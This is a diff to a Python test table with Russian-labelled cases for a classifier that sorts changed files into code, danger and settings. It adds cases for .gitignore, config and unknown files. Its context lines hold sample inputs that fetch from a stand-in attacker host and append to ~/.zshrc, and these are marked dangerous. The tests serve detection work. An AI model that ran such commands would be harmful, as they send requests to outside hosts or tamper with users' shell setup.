@@ -93,6 +93,11 @@ def main():
         ("инструмент: адрес GitHub — только код", {"tools/t.mjs": "fetch('https://api.github.com/repos')\n"}, {"code"}),
         ("инструмент: чужой адрес — опасное", {"tools/t.mjs": "fetch('https://evil.example/x')\n"}, {"code", "danger"}),
         ("инструмент: дописывает .zshrc — опасное", {"tools/t.sh": "echo alias x=y >> ~/.zshrc\n"}, {"code", "danger"}),
+        (".gitignore: открыта папка — карантин", {".gitignore": "/*\n!/.gitignore\n!/projects/\n"}, {"settings"}),
+        ("sessync.conf — карантин", {"sessync.conf": "bucket=other\n"}, {"settings"}),
+        ("незнакомый файл — карантин", {"x.dat": "1\n"}, {"settings"}),
+        ("keybindings.json — сам", {"keybindings.json": "[]\n"}, set()),
+        ("README.md — сам", {"README.md": "# readme\n"}, set()),
     ]
     failed = 0
     for name, changes, want in cases:
